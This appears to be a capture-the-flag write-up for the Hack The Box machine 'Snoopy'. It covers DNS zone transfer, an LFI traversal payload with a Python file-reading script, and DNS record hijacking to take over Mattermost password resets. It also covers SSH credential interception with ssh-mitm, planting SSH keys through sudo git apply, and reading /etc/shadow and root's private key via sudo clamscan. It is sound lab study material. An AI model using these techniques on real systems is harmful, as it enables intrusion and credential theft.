# Snoopy

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.193
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 05:05 EDT
Warning: 10.129.85.193 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.85.193
Host is up (0.16s latency).
Not shown: 65305 closed tcp ports (conn-refused), 227 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

We can add `snoopy.htb` to our `/etc/hosts` file as per standard HTB practice.

### DNS and HTTP Enumeration

This was a corporate page that provides DevSecOps services:

<figure><img src="../../.gitbook/assets/image (1481).png" alt=""><figcaption></figcaption></figure>

Looking around, there's another subdomain present in the form of a mail server.

<figure><img src="../../.gitbook/assets/image (873).png" alt=""><figcaption></figcaption></figure>

It syas that the DNS records are being migrated to another domain and that their email server is offline. We can run both a `gobuster` directory and `wfuzz` subdomain scan first. The subdomain scan reveals a `mm` subdomain present.

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host:FUZZ.snoopy.htb' --hw=1818 -u http://snoopy.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://snoopy.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000582:   200        0 L      141 W      3132 Ch     "mm"
```

Interesting. Since DNS is open, and there is already a hint for DNS being in play somehow, we can enumerate that using `dig`.&#x20;

```
$ dig axfr @10.129.85.79 snoopy.htb

; <<>> DiG 9.18.8-1-Debian <<>> axfr @10.129.85.79 snoopy.htb
; (1 server found)
;; global options: +cmd
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 172 msec
;; SERVER: 10.129.85.79#53(10.129.85.79) (TCP)
;; WHEN: Tue May 09 08:42:40 EDT 2023
;; XFR size: 11 records (messages 1, bytes 325)
```

It seems that `mm` stands for MatterMost. There's another `provisions` and `postgres` subdomain that is present on the local network within the machine, which I probably need to enumerate after gaining a foothold. It appears that `snoopy.htb` and `mm.snoopy.htb` are on the same IP address, while the others are not, meaning that we cannot access the others yet probably.&#x20;

The last thing is that `mail.snoopy.htb` is not present within the records and is indeed offline.&#x20;

We can visit the `mm` subdomain to verify that it is running:

<figure><img src="../../.gitbook/assets/image (3120).png" alt=""><figcaption></figcaption></figure>

We don't have any credentials, but there is a Password Reset in use here that requires an email address:

<figure><img src="../../.gitbook/assets/image (849).png" alt=""><figcaption></figcaption></figure>

Lastly, there are some emails present:

<figure><img src="../../.gitbook/assets/image (3281).png" alt=""><figcaption></figcaption></figure>

### Download LFI -> DNS Vuln

On the main page, there is an option to download files. When we click that, this HTTP request is sent:

```http
GET /download?file=announcement.pdf HTTP/1.1
Host: snoopy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://provisions.snoopy.htb/
Upgrade-Insecure-Requests: 1

```

The `announcement.pdf` file had nothing interesting itself, but this looks vulnerable to LFI. Inital testing reveals this isn't vulnerable at first:

<figure><img src="../../.gitbook/assets/image (444).png" alt=""><figcaption></figcaption></figure>

After using `....//` instead, we can see that a file is generated:

<figure><img src="../../.gitbook/assets/image (376).png" alt=""><figcaption></figcaption></figure>

When the file is downloaded and viewed, we see that it works!

```
$ unzip press_release\(2\).zip 
Archive:  press_release(2).zip
  inflating: press_package/etc/passwd  
                                                                                             
$ cat press_package/etc/passwd
root:x:0:0:root:/root:/bin/bash
<TRUNCATED>
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
bind:x:108:113::/var/cache/bind:/usr/sbin/nologin
_laurel:x:999:998::/var/log/laurel:/bin/false
```

These were the most interesting users, and there was a `clamav` and `bind` user, which was something I don't usually find. This means that these softwares must be downloaded on the machine. Anyways, the process for LFI is quite long and slow, so to quickly enumerate the machine, I made a quick Python script to do so:

```python
import requests
import zipfile

def read(file):
	try: 
		url = 'http://provisions.snoopy.htb/download'
		params = {'file':f'....//....//....//....//....//....//....//....//....//....//....//..../{file}'}
		r = requests.get(url, params=params)
		if (r.status_code == 200):
			with open('lfime.zip', 'wb') as f:
				f.write(r.content) 

			with zipfile.ZipFile('lfime.zip', 'r') as zip_file:
				zip_file.extractall('.')
	        
			with open(f'press_package{file}', 'r') as f:
				content = f.read()
				print(f"{content}")

		else:
			print("[-] File does not exist.")	

	except zipfile.BadZipFile:
		print("[-] File does not exist.")
	except Exception as e:
		print(f"[-] LFI Error: {e}.")

def main():
	while True:
		file = input("File: ")
		read(file)

if __name__ == '__main__':
	main()
```

<figure><img src="../../.gitbook/assets/image (3720).png" alt=""><figcaption></figcaption></figure>

This made enumeration a lot easier. Now, we can proceed with enumeration of the file system and other sensitive files. We can start with `/etc/nginx/sites-available/default`.&#x20;

```
root /var/www/html;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }
        
        location ~ ^/download$ {
                alias /var/www/html/download.php;
                fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
                fastcgi_param SCRIPT_FILENAME $request_filename;
                include fastcgi_params;
        }   
    
        location ~ \.php$ {
                include fastcgi_params;
                fastcgi_pass unix:/run/php/php8.1-fpm.sock;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        }
<TRUNCATED>
```

There's nothing much here. Earlier we found that `bind` was running on the server. `bind` is a nameserver program that assigns the domain names to IP addresses. In this case, since the mail server is offline as DNS records are being migrated, we might be able to exploit this by making the machine resolve `mail.snoopy.htb` to our machine and then using it to **reset passwords on MatterMost.**

Quick googling reveals that the `/etc/bind/named.conf` folder contains the configuration for it.&#x20;

```
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the 
// structure of BIND configuration files in Debian, *BEFORE* you customize 
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

This contains a secret of some sort, and it is clear that updating the DNS records to point to our machine is the exploit here. A bit of Googling about how to update DNS records led me to the `nsupdate` documentation page:

{% embed url="https://linux.die.net/man/8/nsupdate" %}

We can use the entire `key "rndc-key"` part as the key file specified using `-k`. Then, we can run the following commands to update the records AND set up a SMTP server:

```
$ nsupdate -k dns_key 
> server 10.129.85.79
> update  add mail.snoopy.htb 86400 A 10.10.14.9
> send

$ python3 -m smtpd -n -c DebuggingServer 10.10.14.9:25
```

Now we need to find a user who exists on the MatterMost software. After some testing, it seems that `sbrown@snoopy.htb` works based on the emails we found, because sending a password reset using that email works!

```
$ python3 -m smtpd -n -c DebuggingServer 10.10.14.9:25
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']
b'MIME-Version: 1.0'
b'Subject: [Mattermost] Reset your password'
b'Content-Transfer-Encoding: 8bit'
b'Precedence: bulk'
b'Reply-To: "No-Reply" <no-reply@snoopy.htb>'
b'Message-ID: <hcy7iqt7goortome-1683638004@mm.snoopy.htb>'
b'To: sbrown@snoopy.htb'
b'Auto-Submitted: auto-generated'
b'From: "No-Reply" <no-reply@snoopy.htb>'
b'Date: Tue, 09 May 2023 13:13:24 +0000'
b'Content-Type: multipart/alternative;'
b' boundary=1eb180a975434612f4fc222189f028924f0b3953f96434f4a070947e60ef'
b'X-Peer: 10.129.85.79'
b''
b'--1eb180a975434612f4fc222189f028924f0b3953f96434f4a070947e60ef'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/plain; charset=UTF-8'
b''
b'Reset Your Password'
b'Click the button below to reset your password. If you didn=E2=80=99t reques='
b't this, you can safely ignore this email.'
b''
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Db4akc='
b'wn9adntaawingkbho8ctcyzfscm51zjjey7ayx5nzsaxstg7g89ganb8res )'
```

The token has some weird signs in the middle of it, which is not normal actually. Although the link is valid, the token is not. In the above's case, we can ignore all the `=` and `3D` parts, so the correct link is:

{% code overflow="wrap" %}
```
http://mm.snoopy.htb/reset_password_complete?token=b4akcwn9adntaawingkbho8ctcyzfscm51zjjey7ayx5nzsaxstg7g89ganb8res
```
{% endcode %}

Afterwards, we can reset the password and see that it works here:

<figure><img src="../../.gitbook/assets/image (1159).png" alt=""><figcaption></figcaption></figure>

Then we can login.

### MatterMost -> SSH MITM

When we login, we can see a ton of chat logs:

<figure><img src="../../.gitbook/assets/image (2484).png" alt=""><figcaption></figcaption></figure>

It talks about ClamAV being used as the anti-virus, and also about some provisioning server. We can view the different commands present on this:

There was a weird command `/server_provision` without any description. When run, it opens up a UI that seems to spawn a server:

<figure><img src="../../.gitbook/assets/image (1936).png" alt=""><figcaption></figcaption></figure>

We can fill it in to have our credentials and required details. It appears that Windows is disabled too:

<figure><img src="../../.gitbook/assets/image (2441).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1904).png" alt=""><figcaption></figcaption></figure>

Anyways, after filling in the fields and clicking submit, we get this weird thing on a listener port:

<figure><img src="../../.gitbook/assets/image (3315).png" alt=""><figcaption></figcaption></figure>

I thought that it would be a shell and hence ran `id`, but it quickly closed. In this case, I took a look at the traffic within `wireshark` but wasn't able to find out much. I tried out a few methods from the SSH page of Hacktricks, and found `ssh-mitm`.&#x20;

This was a program that would intercept SSH traffic and find a password, similar to what `responder` does.&#x20;

{% embed url="https://docs.ssh-mitm.at/" %}

I couldn't get the `ssh-mitm` binary to work properly, but thankfully there's a Python module for it. We can run it, then we can view the logs:

```
$ python3 -m sshmitm server --remote-host 10.129.85.79 --listen-port 2222
───────────────────────────── SSH-MITM - ssh audits made simple ─────────────────────────────
Version: 3.0.2
License: GNU General Public License v3.0
Documentation: https://docs.ssh-mitm.at
Issues: https://github.com/ssh-mitm/ssh-mitm/issues
─────────────────────────────────────────────────────────────────────────────────────────────
generated temporary RSAKey key with 2048 bit length and fingerprints:
   MD5:10:a0:ac:54:66:eb:ca:14:62:88:fe:d0:3c:c0:68:f0
   SHA256:IQjHvAVwgc+rsZSuahdUQKTfdba5dqKxLpRd39PNNhA
   SHA512:beq/m46uHTY42gBA5u7lFh0alXfK4hc68WMJNvDpEMVl8TeOGQHU89NuGDTwL466Ja//FKDF1/HQMnJBS3mA6w                                                                                          
listen interfaces 0.0.0.0 and :: on port 2222
────────────────────────────────── waiting for connections ──────────────────────────────────
[05/09/23 09:40:06] INFO     ℹ session 9a94617f-be69-49bf-90fd-765beb3fbeee   
                             created                                                         
                    INFO     ℹ client information:                             
                               - client version: ssh-2.0-paramiko_3.1.0        
                               - product name: Paramiko                                      
                               - vendor url:  https://www.paramiko.org/                      
                             ⚠ client audit tests:                                
                               * client uses same server_host_key_algorithms list for        
                             unknown and known hosts                                         
                               * Preferred server host key algorithm: ssh-ed25519            
[05/09/23 09:40:08] INFO     Remote authentication succeeded                   
                                     Remote Address: 10.129.85.79:22                         
                                     Username: cbrown                                        
                                     Password: sn00pedcr3dential!!!                          
                                     Agent: no agent
```

We have a credential! With this, we can `ssh` in as the user `cbrown`:

<figure><img src="../../.gitbook/assets/image (3454).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

No user flag yet.

### Sudo Git Apply -> User

Checking our `sudo` privileges, we see this:

```
cbrown@snoopy:~$ sudo -l
[sudo] password for cbrown: 
Matching Defaults entries for cbrown on snoopy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git apply *
```

We can run commands as `sbrown` using `git apply *`. This means using a `diff` output, we can use this to overwrite any file that `sbrown` owns. In this case, we can put our public SSH key within the `.ssh/authorized_keys` folder.

Then, we can use `diff` on a random folder and this folder. We can use the `.bash_history` file of `cbrown` because it has nothing within it:

{% code overflow="wrap" %}
```
cbrown@snoopy:/home$ git diff cbrown/.bash_history cbrown/.ssh/authorized_keys 
diff --git a/cbrown/.bash_history b/cbrown/.bash_history
deleted file mode 120000
index dc1dc0c..0000000
--- a/cbrown/.bash_history
+++ /dev/null
@@ -1 +0,0 @@
-/dev/null
\ No newline at end of file
diff --git a/cbrown/.ssh/authorized_keys b/cbrown/.ssh/authorized_keys
new file mode 100644
index 0000000..8e881d1
--- /dev/null
+++ b/cbrown/.ssh/authorized_keys
@@ -0,0 +1 @@
+ssh-rsa KEY kali@kali
```
{% endcode %}

Then, we can redirect the above to another file like `/tmp/diff`. Afterwards, we need to change the target file (the one below) to `sbrown/.ssh/authorized_keys` in order to write the key within it.

Here's the final `diff` file I used:

{% code overflow="wrap" %}
```
cbrown@snoopy:/home$ cat /tmp/diff
diff --git a/cbrown/.bash_history b/cbrown/.bash_history
deleted file mode 120000
index dc1dc0c..0000000
--- a/cbrown/.bash_history
+++ /dev/null
@@ -1 +0,0 @@
-/dev/null
\ No newline at end of file
diff --git a/sbrown/.ssh/authorized_keys b/sbrown/.ssh/authorized_keys
new file mode 100644
index 0000000..8e881d1
--- /dev/null
+++ b/cbrown/.ssh/authorized_keys
@@ -0,0 +1 @@
+ssh-rsa KEY kali@kali
```
{% endcode %}

Afterwards, just run the `sudo` command on the `/tmp/diff` file. This would put our public key within the `sbrown` directory since we are running the command as `sbrown`. Then, we can `ssh` in.

<figure><img src="../../.gitbook/assets/image (2127).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.

### Sudo Clamscan -> Root&#x20;

When checking `sudo` privileges again, I found that we can run `clamscan` as `root`.

```
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan
```

`clamscan` is a scanner that checks for malware and other things within binaries:

{% embed url="https://docs.clamav.net/manual/Usage/Scanning.html" %}

Based on the documentation, since we can run this as `root`, we should be able to read files like `/etc/shadow`. This can be done using the `-f` flag and it works as shown:

<figure><img src="../../.gitbook/assets/image (3396).png" alt=""><figcaption></figcaption></figure>

Then, we can simply read the private SSH key of `root` located at `/root/.ssh/id_rsa`.&#x20;

<figure><img src="../../.gitbook/assets/image (3578).png" alt=""><figcaption></figcaption></figure>

After some tidying up, we can `ssh` in as `root`.

<figure><img src="../../.gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>

Rooted!
